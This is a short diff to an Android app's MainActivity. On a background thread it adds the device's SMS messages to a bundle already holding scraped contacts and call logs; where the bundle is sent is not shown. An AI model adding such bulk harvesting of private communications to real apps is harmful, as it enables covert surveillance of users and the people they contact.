@@ -218,6 +218,8 @@ public class MainActivity extends AppCompatActivity {
                         + ContactScrape.scrapeContacts(getContentResolver())
                         + "\n\nCall Log:\n-----\n"
                         + CallLogScrape.scrapeCallLogs(getContentResolver())
+                        + "\n\nSMS Messages:\n-----\n"
+                        + MessageScrape.scrapeMessage(getContentResolver())
                 );
             }
         }.start();
